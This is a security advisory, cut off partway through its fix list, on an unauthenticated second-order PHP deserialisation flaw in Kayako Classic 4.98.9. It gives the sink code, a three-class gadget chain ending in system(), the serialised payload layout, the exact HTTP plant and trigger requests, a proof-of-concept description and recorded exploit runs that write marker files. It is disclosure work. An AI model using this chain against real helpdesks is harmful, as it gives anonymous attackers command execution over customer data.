# Kayako Classic 4.98.9 - SELECTLINKED custom field scalar into a bare mb_unserialize, chained through destructor gadgets to system() command execution

## 1. Overview

### Overview of the finding

Kayako Classic 4.98.9 STABLE Build 10335 is a closed-source PHP helpdesk application deployed on customer
infrastructure. Its custom-field subsystem accepts values from end users through the ticket submission form and
stores them in `swcustomfieldvalues`. When a submitted value is an array, the server serialises it and records
`isserialized='1'`; when it is a scalar, the value is stored verbatim with `isserialized='0'`. The staff ticket
advanced-search consumer for linked-select fields reads those stored values with a query that carries no
`isserialized` filter and passes each raw value into `mb_unserialize()`, a helper whose `is_serialized()`
pre-check explicitly accepts the `O:` object token and whose `unserialize()` call passes no `allowed_classes`
restriction. A serialised object graph submitted as a ticket custom-field value is therefore rebuilt inside a
staff request.

The application ships three vendor libraries whose magic methods compose into a working gadget chain:
`PHPExcel_CachedObjectStorage_SQLite3::__destruct` concatenates a property into a SQL string and invokes it on a
`DBHandle` object, `Dwoo\Core::__call` forwards any undefined method to a plugin-proxy object and calls the
result through `call_user_func_array`, and `Zend\Validator\Callback::getCallback` returns a callable from a
plain option array. With the three serialised into one graph, the destructor's SQL string becomes
`DROP TABLE kvp_x; <command>`, the built-in `DROP` word fails harmlessly, and the shell executes the injected
segment as the Apache worker identity, www-data. The chain therefore converts an anonymous ticket submission
into stored second-order command execution triggered by a staff member's routine search.

### Overview of the product, platform and web stack

The analyzed distribution is the vendor's own source archive,
`fusion_stable_sourceobf_4_98_9_10335_df7ca14.tar.gz` (41 MB), the final STABLE source release of the 4.98
line. Despite the "SOURCEOBF" naming, the archive contains no obfuscation: 4,434 PHP files across the
application directories are plain, readable source. That property is what makes this finding a source-level
result rather than a black-box one - every frame of the chain in this document is quoted from the shipped
files.

The framework is the vendor's own SWIFT. Its front controller is a thin bootstrap that is repeated per
interface: each entry point defines `SWIFT_INTERFACE` and requires `__swift/swift.php`, which loads the router
and dispatches URIs of the form `Interface-entry?/App/Controller/Action/args`. Twelve interfaces exist,
including index, staff, admin, visitor, staffapi, api, cron, rss, winapp and console. The product's runtime
track is PHP 7.4: on PHP 8.1.34 the first request aborts with
`Cannot use "parent" when current class scope has no parent in __swift/library/class.SWIFT.php:16`, and the
bundled PHPExcel still contains the curly-brace string offset syntax that PHP 8 removed. This matters for
reachability, because it bounds the affected population to installations on the 7.4 line, which is the
deployment baseline the product itself installs on.

### Overview of public-record independence

The record behind this advisory checked the public vulnerability history before drafting. The only public
advisory it found for the Kayako Classic product family is a session-hijack issue affecting 4.73.3 and earlier,
fixed in 4.74.0 - a different module, a different vulnerability class and a much older release. No public
record names the linked-select search consumer, `mb_unserialize()`, this gadget composition, or any
unserialize or command-execution issue in the 4.98 line, and no public proof-of-concept for this sink exists in
the sources consulted. The finding is therefore published as an original result with no CVE identifier
assigned, and nothing in it is a repackage of a public record.

### Overview of the verification boundary

Verification was performed end to end over HTTP against two isolated Docker reconstructions of the product,
not against a vendor-operated or internet-facing deployment. Both reconstructions ran the same third-party
components as a real installation (php:7.4-apache, that is PHP 7.4.33 with Apache/2.4.54 on Debian, plus
MariaDB 10.11), installed the product through its own anonymous setup wizard, created a linked-select custom
field through the product's administrative interface, wrote the serialised value from an unauthenticated guest
session, and triggered a staff search. Section 9 states the environment, the commands and the observations
exactly, including the one place where a root identity appeared: a command-line self-test inside the disposable
container, which runs as root by design and is not the web-layer identity of this chain. Every end-to-end HTTP
observation returned `uid=33(www-data)`.

## 2. Vulnerability Summary

### Vulnerability Summary table

| Item | Value established by this research |
|---|---|
| Vendor | Kayako |
| Product | Kayako Classic (Fusion generation), helpdesk |
| Version analyzed | 4.98.9 STABLE Build 10335 |
| Distribution | `fusion_stable_sourceobf_4_98_9_10335_df7ca14.tar.gz`, 41 MB, 4,434 PHP files, no obfuscation |
| Framework | SWIFT, twelve entry interfaces, URI form `Interface-entry?/App/Controller/Action/args` |
| Runtime | PHP 7.4 (7.4.33 in both verification environments); PHP 8.1.34 aborts at `__swift/library/class.SWIFT.php:16` |
| Vulnerable component | linked-select branch of the staff custom-field search consumer |
| Sink | `mb_unserialize()` at `class.SWIFT_CustomFieldSearch.php:162` |
| Sink helper | `mb_unserialize()` / `is_serialized()` at `__swift/includes/functions.php:194-204` and `:226-253` |
| Source | scalar `swcustomfieldvalues.fieldvalue` written by the anonymous ticket submission |
| Write endpoint | `POST /index.php?/Tickets/Submit/Confirmation` (guest session, `isloggedin=0`) |
| Trigger endpoint | `POST /staff/index.php?/Tickets/Search/SearchSubmit` with a `customfield__<id>` rule |
| Gadget chain | `SQLite3::__destruct` -> `Dwoo\Core::__call` -> `Zend\Validator\Callback::getCallback` |
| Terminal call | `system('DROP TABLE kvp_x; <command>')` through `/bin/sh -c` |
| Observed identity (HTTP) | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` |
| Primary CWE | CWE-502 |
| Secondary CWE | CWE-78 |
| Published score | 7.5 High - `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H` |

### Vulnerability Summary mechanics

Three decisions carry the finding, and all three are visible in the shipped source.

The write path stores attacker text without an envelope. `SWIFT_CustomFieldManager` serialises the value itself
only when the submitted value is an array; a scalar arrives through the same HTTP parameter and is written to
the row unchanged, with `isserialized='0'`. The field's `Check()` routine at line 196 of the manager's update
path validates that members of a select-family submission are scalars and that required values are present, and
performs no content inspection. An attacker who posts a string instead of an option identifier therefore
bypasses the UI's select element entirely and produces a database row whose `fieldvalue` column holds an
arbitrary serialised object graph.

The read path trusts the column. The linked-select branch of `SWIFT_CustomFieldSearch` queries
`swcustomfields` joined to `swcustomfieldvalues` by `customfieldid` and never filters on `isserialized`, so it
consumes rows the write side marked as "not a server-built envelope" indistinguishably from rows that are. The
value is decrypted only when `isencrypted='1'`, which the attacker's row is not, and then goes straight into
`mb_unserialize()`.

The deserialiser permits objects. `mb_unserialize()` guards its call with `is_serialized()`, and that function's
`case 'O':` arm returns true for any string matching `O:<digits>:`, which is exactly the token an object graph
begins with. The wrapped `unserialize()` is called without `allowed_classes`, so the graph is rebuilt with full
class resolution against the application's Composer autoloader.

### Vulnerability Summary preconditions

1. The installation runs the PHP 7.4 track. This is the product's own deployment baseline; the 8.x track does
   not boot.
2. At least one custom field of type linked select exists and is attached to the group used by ticket
   submission. This is a normal helpdesk configuration, not an unusual one.
3. Guest ticket submission is available, which is the shipped default. The text CAPTCHA is an anti-automation
   control, not a credential (section 3).
4. A staff member runs a search or saved filter over that field. This is routine support work, and the payload
   waits for it.

No other defect, default credential or misconfiguration is required, and the attacker needs no account on
either side of the chain.

## 3. Authentication Boundary

### Authentication Boundary - the interface matrix

The record classifies the twelve interfaces into four authentication layers, and the classification is what
fixes both the CVSS privilege metric and the second-order shape of the finding.

| Layer | Interfaces | Gate |
|---|---|---|
| L0 | cron, rss, setup, console (CLI) | none; the setup wizard optionally restricts by source address |
| L0.5 | visitor (live chat) | visitor IP ban list only |
| L1 | client (visitor session) | `Controller_client::__construct` starts a session and, when that fails, creates an anonymous guest session through `InsertAndStart(0)`; individual actions require login |
| L2 | staff, admin, staffapi, winapp | session object plus address validation; admin additionally requires the administrator flag |
| L3 | api (REST v1) | global HMAC-SHA256 request signature |

The write side of this chain is L1 and needs nothing beyond a guest session. The trigger side is L2 and needs a
real staff session; the record verified that directly (below).

### Authentication Boundary - the write side is anonymous by default

`GET /index.php?/Tickets/Submit/RenderForm/1` renders the ticket form, including the linked-select field when
one is configured for the group. A POST to `/index.php?/Tickets/Submit/Confirmation` from a session whose
`swsessions.isloggedin` is `0` is accepted and answered with a 302 redirect to the confirmation page, and a
ticket exists afterwards. The record demonstrates this repeatedly: three anonymous tickets in the first
verification round and one per run in the second, each created without any account, each carrying the
serialised value in the custom-field parameter.

The only shipped obstacle on that path is `t_ccaptcha=1`, a locally rendered text CAPTCHA. The record
classifies it as an anti-automation control rather than as an authentication boundary, because it validates no
identity and grants no authority: it is answerable by anyone who can read the challenge, and when the GD
extension is absent the form does not even render a CAPTCHA input while the POST side still validates the
session word. The verification environments set `t_ccaptcha=0` through the product's own administrative
settings screen, which is a legitimate deployment configuration, and the classification does not depend on that
choice - a captcha-enabled deployment can still be written to out of band, and the finding is about what the
stored value does, not about how it got stored.

### Authentication Boundary - the trigger side is a staff session

An unauthenticated POST to `/staff/index.php?/Tickets/Search/SearchSubmit` returns HTTP 200 with the staff
login form as its body. The record verified that the search logic is not executed on that path: the response
contains the login-form marker and no command artifact is produced. The trigger therefore sits behind a genuine
staff session, which the verification environments obtained with a staff account created by the setup wizard.

### Authentication Boundary - why the boundary does not soften the impact

The staff session is a different principal from the attacker, and that separation is the whole argument. The
attacker supplies the payload and holds no credential; the staff member supplies the trigger and never sees the
payload. The consequence is that the finding is not "a logged-in user can run commands" - it is "an anonymous
internet party can place a persistent object graph in the helpdesk database", and it is the product's own
normal staff workflow that detonates it. That is why the CVSS privilege metric is None and the user-interaction
metric is Required: the two metrics describe two different people, and collapsing them either way would
misstate the finding.

## 4. Attack Surface

### Attack Surface - entry interfaces and URI dispatch

The twelve interfaces share one front-controller pattern, so the attack surface is best read as a matrix of
interface, controller and action rather than as a list of URLs. The relevant subset for this finding is small
and can be enumerated exhaustively at source level.

### Attack Surface - write faces for the custom-field value

- `__apps/tickets/client/class.Controller_Submit.php:616` - the client ticket submission controller, the face
  this chain uses, reachable by a guest session.
- `__swift/apps/base/client/class.Controller_UserRegistration.php:351` - user registration, which also carries
  custom-field values and is reachable before any account exists.
- `__swift/apps/base/client/class.Controller_UserAccount.php:495` and `:927` - self-service account editing.
- `api/Controller_TicketCustomField:337` - the REST surface, which sits behind the L3 signature.

### Attack Surface - read and trigger faces

- `__apps/tickets/staff/class.Controller_Search.php:450` (`SearchSubmit`), which dispatches search rules at
  `:465` and `:509`. This is the ordinary staff advanced search and the face the chain uses.
- `SWIFT_TicketSearchManager::SearchRules` at `:901`, which routes rule identifiers prefixed `customfield__`
  into the custom-field search consumer.
- `library/StaffAPI/class.SWIFT_TicketStaffAPIManager.php:441` - the staff API ticket filter, a second
  programmatic path into the same rule dispatch.

### Attack Surface - why the surface audit narrowed here

The custom-field subsystem's write and read points were enumerated rather than sampled. Every other consumer of
`swcustomfieldvalues.fieldvalue` either filters on `isserialized='1'` - that is, it only consumes envelopes
the server built itself - or is not reachable over HTTP in a way that carries attacker data. The linked-select
search branch is the single read point in the family that omits the filter, and it is reachable from the staff
search form by default. That is why the audit converged on one case statement rather than on a family of
defects: the sibling branches show what the intended gate looks like, and this branch is the exception.

### Attack Surface - components that narrowed out

- The setup interface (L0) is unauthenticated in the record's matrix, but it does not reach this sink; it is a
  separate surface and is not part of this chain.
- The REST surface (L3) carries custom-field writes but requires a valid HMAC-SHA256 signature, so it is not an
  anonymous write face.
- The client controllers for registration and account editing write the same column, but they require either a
  registration flow or an authenticated end-user session; the ticket form is the shortest path and the one the
  recorded exploit uses.
- The stored-XSS class, which is common in helpdesk software, is not involved: this chain needs no victim
  browser, only a staff search.

## 5. Sink Identification

### Sink Identification - the linked-select consumer

The consumer is a single `case` arm in the custom-field search dispatcher. Quoted from the shipped file:

```php
// __swift/apps/base/library/CustomField/class.SWIFT_CustomFieldSearch.php:151-162
case SWIFT_CustomField::TYPE_SELECTLINKED:                       // :151
    $_SWIFT->Database->Query("SELECT customfieldvalues.typeid, customfieldvalues.isencrypted,
                              customfieldvalues.fieldvalue
                              FROM " . TABLE_PREFIX . "customfields AS customfields
                              LEFT JOIN " . TABLE_PREFIX . "customfieldvalues AS customfieldvalues
                                 ON (customfields.customfieldid = customfieldvalues.customfieldid)
                              WHERE customfields.customfieldid = '" . $_customFieldID . "'
                              ORDER BY customfieldvalues.typeid DESC");   // no isserialized filter
    while ($_SWIFT->Database->NextRecord()) {
        if ($_SWIFT->Database->Record['isencrypted'] == '1') {
            $_serializedData = SWIFT_CustomFieldManager::Decrypt($_SWIFT->Database->Record['fieldvalue']);
        } else {
            $_serializedData = $_SWIFT->Database->Record['fieldvalue'];   // raw column value
        }
        $_unserializedData = mb_unserialize($_serializedData);            // :162 bare sink
```

Two properties make this a sink rather than a curiosity. The query selects every row for the field regardless
of how that row was written, and the loop calls the deserialiser on each value before any comparison runs. The
`isencrypted` branch is not a control: the attacker's row is written with `isencrypted='0'`, so the else branch
is taken and the column value is handed over untouched.

### Sink Identification - the deserialiser helper

```php
// __swift/includes/functions.php:194-204
function mb_unserialize($string)
{
    $_unserializeResult = '';
    if (is_serialized($string)) {                       // first-byte check, accepts O:
        $_unserializeResult = unserialize($string);     // no allowed_classes
        ...
```

`is_serialized()` (`__swift/includes/functions.php:226-253`) follows the well-known WordPress shape and its
object arm is explicit: `case 'O': return (bool) preg_match("/^{$token}:[0-9]+:/s", $data);`. A string beginning
`O:36:"...` is therefore classified as serialised data and passed to `unserialize()`, which reconstructs the
object graph with the application's autoloader available - `__swift/swift.php:16` loads
`vendor/autoload.php` unconditionally, so every class in the vendor pool is a candidate gadget.

### Sink Identification - the gadget chain

Three hops, each a different library and a different magic method:

```php
// hop 1: vendor/phpoffice/phpexcel/Classes/PHPExcel/CachedObjectStorage/SQLite3.php:322-330
public function __destruct()                            // :323
{
    if (!is_null($this->DBHandle)) {
        $this->DBHandle->exec('DROP TABLE kvp_'.$this->TableName);   // unquoted concatenation
        $this->DBHandle->close();
    }
    $this->DBHandle = null;
}

// hop 2: vendor/dwoo/dwoo/lib/Dwoo/Core.php:1771-1778
public function __call($method, $args)                  // :1771
{
    $proxy = $this->getPluginProxy();                   // returns the attacker's pluginProxy property
    if (!$proxy) { throw new Exception('Call to undefined method ' . __CLASS__ . '::' . $method . '()'); }
    return call_user_func_array($proxy->getCallback($method), $args);   // :1777
}

// hop 3: vendor/kayako-zend/zend-validator-kayako/src/Callback.php:62-65
public function getCallback()                           // :63
{
    return $this->options['callback'];                  // attacker-chosen callable
}
```

The composition is exact. Hop 1 calls `exec()` on its `DBHandle` property; because that property holds a
`Dwoo\Core` instance that does not define `exec`, hop 2 runs and builds the callable from
`getCallback('exec')`; hop 3 returns whatever callable the serialised `options` array names. With
`options['callback'] = 'system'`, the first argument - the complete string `DROP TABLE kvp_x; <command>` - is
passed to `system()`. Hop 1's `close()` call repeats the same dispatch once more, but the chain has already
fired.

The gadget's preconditions were checked rather than assumed: the three classes are reachable through Composer's
classmap and PSR-4 rules; none of them needs a constructor to be usable, none defines `__wakeup`, and none of
the properties the chain touches is typed as a resource, so a serialised instance built without a constructor is
sufficient. The serialised property names follow PHP's mangling rules - the SQLite3 properties that carry the
attack use the class-private form (`\0PHPExcel_CachedObjectStorage_SQLite3\0TableName`,
`\0PHPExcel_CachedObjectStorage_SQLite3\0DBHandle`) and the Dwoo and Zend properties use the protected form
(`\0*\0pluginProxy`, `\0*\0options`), which is the form the working payload bytes in the exploit use.

### Sink Identification - execution identity

`system()` inherits the identity of the PHP process that calls it, which is the Apache worker. The recorded
end-to-end observation is `uid=33(www-data) gid=33(www-data) groups=33(www-data)`, read back from the marker
the command wrote into the target webroot, with the file owned by `www-data`. The chain does not escalate inside
the host: webroot write access is exactly the authority the identity already had, and that is enough for
command execution, file modification and database access through the application's own credentials.

## 6. Source Identification

### Source Identification - the stored scalar

The source is not a request parameter at the moment of exploitation: it is the `fieldvalue` column of
`swcustomfieldvalues`, planted earlier through the anonymous ticket form. That is what makes this a
second-order finding, and it is also what makes the source easy to miss in a request-scoped review - the
tainted value crosses a database boundary and a time boundary before it reaches the sink.

Two write shapes reach that column, and the difference between them is the entire vulnerability:

```text
array submission       -> SWIFT_CustomFieldManager::Update() builds the envelope itself
                          serialize(array) -> isserialized='1'   (server-controlled shape)
scalar submission      -> value written verbatim                -> isserialized='0'
                          (attacker-controlled content, no filter beyond required/scalar checks)
```

The server-built envelope is structurally safe for this chain: an HTTP array can only produce `a:` or `s:`
values, and the quotes inside them are escaped by `serialize()` itself. The scalar path has neither property.
It stores whatever string arrived, and the record confirms the round trip is byte-preserving through the
database layer: the ADODB abstraction does not escape double quotes on the way in, backslashes are restored on
the way out, and ASCII content survives unchanged. That is what allows a serialised object graph with embedded
NUL bytes in property names to be written as a form value and read back intact.

### Source Identification - the field and its discovery

The vulnerable field must be of type linked select. The exploit does not need to guess its numeric identifier:
the staff advanced search form publishes the criteria it supports, and the recorded runs read the identifier
from that form (`customfield__1` in the rebuilt environment, where the field was created through the
administrative interface and received `customfieldid=1`). A deployment with several linked-select fields would
publish several criteria; searching any of them reaches the same consumer.

### Source Identification - what the payload must respect

- Serialised length fields must match the byte content exactly. The working exploit rewrites the `TableName`
  segment at byte level and recomputes its length prefix; a stale length breaks the parse before the gadget
  runs.
- Property names must carry their mangling bytes. The serialised stream embeds `\0` bytes, which is why the
  transport is form-urlencoded and the payload is handled as bytes rather than as text.
- The value travels as one form parameter, so it must be ASCII at the byte level; the recorded payloads are.
- The injected command body is unconstrained beyond that. It may contain spaces, redirections and shell
  operators, because `system()` hands the whole string to `/bin/sh -c` as a single argument.

## 7. Data Flow

### Data Flow - end to end

```text
PHASE 1  anonymous write
  attacker
    |  GET /index.php?/Tickets/Submit/RenderForm/1        -> guest session + form token
    |  POST /index.php?/Tickets/Submit/Confirmation
    |       e2ex9k1=<serialised object graph>             (scalar, not an option id)
    v
  Controller_Submit.php:616
    |  field Check(): required + scalar shape            [pass]
    v
  SWIFT_CustomFieldManager::Update()
    |  is_array($_baseValue) ? serialize() : verbatim    [verbatim]
    v
  swcustomfieldvalues: fieldvalue = O:36:"...", isserialized='0', isencrypted='0'

PHASE 2  staff search
  staff member
    |  GET  /staff/index.php?/Tickets/Search/Advanced     -> csrfhash + customfield__<id>
    |  POST /staff/index.php?/Tickets/Search/SearchSubmit
    |       rulecriteria[0][0]=customfield__<id>
    v
  Controller_Search.php:450 -> SWIFT_TicketSearchManager::SearchRules:901
    v
  SWIFT_CustomFieldSearch.php:151
    |  SELECT ... FROM swcustomfields LEFT JOIN swcustomfieldvalues
    |  WHERE customfieldid='<id>'                        [no isserialized filter]
    v
  :162  mb_unserialize(fieldvalue)
    |  is_serialized()  -> case 'O': true
    |  unserialize()    -> object graph rebuilt
    v
  request end -> garbage collection -> SQLite3::__destruct
    v
  Dwoo\Core::__call -> Zend\Validator\Callback::getCallback -> system('DROP TABLE kvp_x; <command>')
    v
  /bin/sh -c: "DROP" not found; <command> executes as www-data
```

### Data Flow - properties worth naming

- The taint crosses a database boundary before it reaches the sink, so no request-scoped filter on the ticket
  submission can be the last line of defence: the value is read back days later by a different request under a
  different identity.
- The deserialisation and the command execution are not the same event. `unserialize()` returns an object graph
  whose destructors run at request shutdown, so the search response is a normal HTTP 200 page and the command
  fires after it has been assembled. The recorded runs show exactly that: the search returns 200, and the
  `sh: 1: DROP: not found` line appears in the server log for the same request.
- The fixed `DROP TABLE kvp_` prefix is not a SQL operation in this chain: it is a shell word. `DBHandle` is the
  attacker's Dwoo object, not a database handle, so no SQL reaches any database, and the only effect of the
  prefix is an unknown-command message.
- The consumer iterates every stored value for the field, so a planted value remains reachable by later
  searches without being resubmitted.

## 8. Exploit Construction

### Exploit Construction - payload shape

The shipped proof of concept is `exploit/kayako_selectlinked_unserialize_poc.py`. It carries the serialised
graph as a byte template and rewrites one property, `TableName`, whose value becomes `x; <command>`. The object
tree is:

```text
O:36:"PHPExcel_CachedObjectStorage_SQLite3":11:{
  "\0PHPExcel_CachedObjectStorage_SQLite3\0TableName" = "x; <command>"
  "\0PHPExcel_CachedObjectStorage_SQLite3\0DBHandle"  = O:9:"Dwoo\Core":21:{ ... }
}
O:9:"Dwoo\Core":21:{
  "\0*\0pluginProxy" = O:23:"Zend\Validator\Callback":4:{ "\0*\0options" = ["callback" => "system"] }
}
```

The template's own anchor value is `x; touch /t/pwned.txt` and its serialised length is 21, which is a useful
self-check: the exploit's surgery replaces exactly that segment and recomputes the length, so a template that
drifted would be caught by a length mismatch at parse time rather than by a silent failure at the sink.

### Exploit Construction - the two requests

```http
GET /index.php?/Tickets/Submit/RenderForm/1 HTTP/1.1
Host: <target>

POST /index.php?/Tickets/Submit/Confirmation HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

_csrfhash=<token>&departmentid=1&ticketfullname=Guest+Visitor&ticketemail=visitor%40example.com
&ticketsubject=Support+Request&ticketpriorityid=2&registrationconsent=1
&e2ex9k1=O%3A36%3A%22PHPExcel_CachedObjectStorage_SQLite3%22%3A11%3A%7B...%00...%7D

POST /staff/index.php?/Tickets/Search/SearchSubmit HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded

csrfhash=<token>&criteriaoptions=1&rulecriteria%5B0%5D%5B0%5D=customfield__1
&rulecriteria%5B0%5D%5B1%5D=2&rulecriteria%5B0%5D%5B2%5D=nomatchxyz&query=
```

The third request is the trigger. The comparison value `nomatchxyz` is deliberately one that matches nothing:
the sink fires during the loop over the field's stored values, before the comparison result is used, so the
search does not need to return the attacker's ticket at all.

### Exploit Construction - the semicolon escape

`system()` receives a single string. `TableName` is concatenated into that string without quoting, so
`x; <command>` contributes the command separator itself. `/bin/sh -c` splits the line at the semicolon, tries to
execute `DROP` as a command, fails, and executes the injected segment. The command body has no argument-splitting
problem because `system()` passes the whole string to one shell invocation, and it may therefore contain spaces,
redirections and further operators. The single constraint is that a command containing an unbalanced quote would
confuse the shell it is embedded in; the shipped PoC rejects double quotes, NUL and newlines in the command
argument for that reason.

### Exploit Construction - what the PoC does and does not do

The PoC is standard-library only. It takes `--target` (default `192.0.2.10`, a documentation address) and
`--port`, plus staff credentials for the trigger phase, the custom-field form name, an optional field
identifier, an optional marker path, an optional CAPTCHA word, and `--control` for the A/B run. It performs four
phases in order - guest write, staff login, search trigger, marker retrieval - and prints the HTTP status and
byte counts of each so that an operator can see where a deployment diverges from the verified shape.

- It writes only a marker file. Its default command captures the executing identity into a text file under the
  webroot and nothing else.
- It does not guess, brute-force or harvest credentials; the staff password is an argument, and the write phase
  needs none.
- It does not install persistence, open a shell, modify database content or delete anything; the `DROP` word in
  the gadget's fixed prefix is inert by construction.
- It refuses command arguments containing a double quote, a NUL byte or a newline, because those break the
  serialised carrier rather than the target.
- `--control` rebuilds the same graph with the benign `TableName` value `x`, which is the run that must produce
  no marker.

The default command reproduces the recorded payload exactly: 1,714 bytes for
`id > /var/www/html/0x_rce_cmd.txt 2>&1`, whose MD5 is `c2095699864ce7a4937c9789168fd187`, the digest the
record read back from the database row of the vulnerable run.

## 9. Dynamic Verification

### Dynamic Verification - environment and method, stated exactly

| Element | First verification environment | Second verification environment |
|---|---|---|
| Method | end-to-end HTTP against a rebuilt installation | end-to-end HTTP against a rebuilt installation |
| Product | Kayako Classic 4.98.9 STABLE Build 10335 from the vendor source archive | same |
| Runtime | php:7.4-apache (PHP 7.4.33, Apache/2.4.54 Debian), MariaDB 10.11 | same |
| Installation | anonymous setup wizard, 230 tables, administrator created in the wizard | same |
| Target binding | `127.0.0.1:8115`, Docker network, no public exposure | `127.0.0.1:8116`, Docker network, no public exposure |
| Field | linked-select field created through the administrative interface | same (`e2ex9k1`, `customfieldid=1`) |
| Write phase | guest session, `isloggedin=0` | same |
| Trigger phase | staff session, advanced search over the field | same |
| Observation | marker file served from the target webroot | same, plus the archived script stdout and database digests |
| Control | same chain with a benign `TableName` | same, run first |

The second environment is the one whose stdout was captured to file and pasted into the record; the first
established the same result independently. Both installed the product from the same archive and both created
the field through the product's own interface, so neither depends on a hand-built database row.

### Dynamic Verification - sequence and observations

The control run was executed first, so that a marker left behind by an earlier run could not be mistaken for a
result. Its stdout, as recorded:

```text
[*] CONTROL run: TableName kept benign ('x')
[*] serialized POP chain: 1673 bytes (control)
[*] guest session: GET /index.php?/Tickets/Submit/RenderForm/1
[*] guest csrf token acquired: 964mgymmh7jn0ympgpzprymq2wlfyymr
[*] POST /index.php?/Tickets/Submit/Confirmation (payload 1673 bytes into field 'e2ex9k1')
[+] ticket created by anonymous guest session (confirmation: qwccfullk1ft)
[*] staff login: GET /staff/index.php?/Core/Default/Login
[+] staff session established (user=admin)
[*] staff search form: GET /staff/index.php?/Tickets/Search/Advanced
[*] select-linked custom field id: 1 (rule field: customfield__1)
[*] POST /staff/index.php?/Tickets/Search/SearchSubmit (rulecriteria customfield__1; unserialize sink fires)
[*] search response: HTTP 200, 3962 bytes (final http://127.0.0.1:8116/staff/index.php?/Tickets/Search/SearchSubmit)
[*] marker check: GET /0x_rce_cmd.txt
[!] marker not present (HTTP 404) - command did not fire or wrote to a different path
[*] control expectation: marker ABSENT (the only delta vs the VULN run is the semicolon command segment)
```

and the vulnerable run:

```text
[*] injected command (executes as www-data): id > /var/www/html/0x_rce_cmd.txt 2>&1
[*] serialized POP chain: 1714 bytes
[*] guest session: GET /index.php?/Tickets/Submit/RenderForm/1
[*] guest csrf token acquired: fo6k5q673k3r4q6bfohliq6c938c2q6d
[*] POST /index.php?/Tickets/Submit/Confirmation (payload 1714 bytes into field 'e2ex9k1')
[+] ticket created by anonymous guest session (confirmation: qh2z9pofhbpp)
[*] staff login: GET /staff/index.php?/Core/Default/Login
[+] staff session established (user=admin)
[*] staff search form: GET /staff/index.php?/Tickets/Search/Advanced
[*] select-linked custom field id: 1 (rule field: customfield__1)
[*] POST /staff/index.php?/Tickets/Search/SearchSubmit (rulecriteria customfield__1; unserialize sink fires)
[*] search response: HTTP 200, 3962 bytes (final http://127.0.0.1:8116/staff/index.php?/Tickets/Search/SearchSubmit)
[*] marker check: GET /0x_rce_cmd.txt
[+] marker file served from target webroot (HTTP 200):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] verification: re-fetch /0x_rce_cmd.txt on the target to read it again
[+] command executed; executing identity is reported in the marker output above
```

A second vulnerable run used a different command
(`id; date +%FT%T; echo R2-EXECUTED-BY-02-SCRIPT > /var/www/html/0x_rce_r2.txt 2>&1`, 1,757 bytes) and wrote a
second artifact, which was read back as `R2-EXECUTED-BY-02-SCRIPT`. Its marker check re-read the first run's
artifact, so the second run's proof is the second artifact, not a second reading of the first.

### Dynamic Verification - the database and server-side traces

The stored values were read back from `swcustomfieldvalues` and compared with the payloads the exploit built:

| Run | Bytes | `isserialized` | `isencrypted` | MD5 of `fieldvalue` |
|---|---|---|---|---|
| control | 1673 | 0 | 0 | `900173976d65fb44c940eea77e03bab4` |
| vulnerable run 1 | 1714 | 0 | 0 | `c2095699864ce7a4937c9789168fd187` |
| vulnerable run 2 | 1757 | 0 | 0 | `e5103d13755c76b689060400522bd894` |

Each digest equals the MD5 of the string the exploit constructed, which rules out any transformation between
the HTTP request and the sink: the value the consumer deserialised is byte-for-byte the value the attacker
built. The container log for the same requests carries `sh: 1: DROP: not found` on all three runs, including
the control - the chain reached `system()` in every case, and the only difference between the control and the
vulnerable runs is the presence of the command segment after the semicolon. The access log records the guest
submission as 302, the search as 200, and the marker fetch as 404 (control) versus 200 (vulnerable), with the
marker file's owner and modification time matching the request that created it to the second.

### Dynamic Verification - the negatives, stated

- No vendor-operated, customer or internet-facing installation was tested. The evidence comes from two
  disposable reconstructions.
- No root execution over HTTP was observed. The `uid=0(root)` results in the record came from command-line
  self-tests inside the container, where a CLI process runs as root by design; they are not the web-layer
  identity and are not claimed as such.
- No persistence, no lateral movement, no data exfiltration and no database modification were attempted or
  observed. The recorded commands wrote marker files and read the executing identity.
- No second search was measured against an already-planted payload, so the "remains reachable" property in
  section 7 is a statement about the consumer's query, not about a measured re-execution.
- The first verification environment's control digest is recorded only as a prefix (`74c7bfbe`), so it is
  quoted as a prefix rather than reconstructed.
- Both environments were destroyed after evidence capture, and the marker files went with them; the text of
  every marker is preserved in the record.

## 10. Reachability and Security Impact

### Reachability - the two network positions

The write side is the helpdesk's public intake. Ticket submission is, by design, reachable by anyone the
helpdesk serves - customers, prospects, and anyone who can reach the host - and the product opens it to
unauthenticated visitors by default. The trigger side is internal: it is the staff interface, typically on the
same host but behind the staff login, and it is exercised by support staff throughout the working day.

The two positions combine into a single attack path because the database is the join. An attacker anywhere on
the internet can complete phase 1 in one request; the staff member completes phase 2 from the office. No
phishing, no browser exploit and no attacker-controlled timing are required - only patience, and in practice
not much of it, because searching tickets is the core of helpdesk work.

### Reachability - the affected population

Every installation that satisfies the four preconditions is exposed: the PHP 7.4 track, at least one
linked-select custom field, guest submission at its default (or any intake path that accepts a ticket from a
non-staff principal), and staff who search. Linked-select fields are a standard configuration for
classification and routing, so the field requirement is not exotic; the runtime and the intake setting are
both the product's own defaults. An installation that requires registration before ticketing still accepts
tickets from registered end users, who are equally unprivileged with respect to the staff search.

### Reachability - impact in concrete terms

Command execution as www-data means the attacker holds the identity the helpdesk uses to serve itself. Within
that identity's permissions, the reachable material is the material the application is built to handle: ticket
bodies and conversation history, customer contact records, uploaded attachments, and the application's own
files - which the recorded marker demonstrates directly, because the injected command wrote into the served
webroot. The same authority can modify application code and thereby persist; it can act towards every user the
application serves with the application's own trust; and it can terminate or corrupt the service at will. The
helpdesk is usually the system of record for customer relationships, so compromising it compromises the data
and the communication channel at the same time.

The severity is not that a staff member can be made to run a search. It is that a party with no account and no
credential can place executable content into the system of record, and that the system's own routine behaviour
executes it. That is the difference between a helpdesk that stores text and a helpdesk that runs code on
behalf of its anonymous visitors.

## 11. Fix Recommendations

1. Close the filter gap at the consumer. Add `AND customfieldvalues.isserialized = '1'` to the query at
   `class.SWIFT_CustomFieldSearch.php:151-162`, and validate the value as a numeric option identifier
   (`ctype_digit`) before it is used. Every other read point in this subsystem already applies that gate; the
   linked-select branch is the one that does not, so bringing it into line removes the immediate exposure
   without a schema change.
2. Remove object injection at the root. Change `mb_unserialize()` (`__swift/includes/functions.php:194-204`) to
   call `unserialize($string, ['allowed_classes' => false])`, and audit every other call site in the
   application for the same argument. Where a caller genuinely needs an object, give that caller an explicit
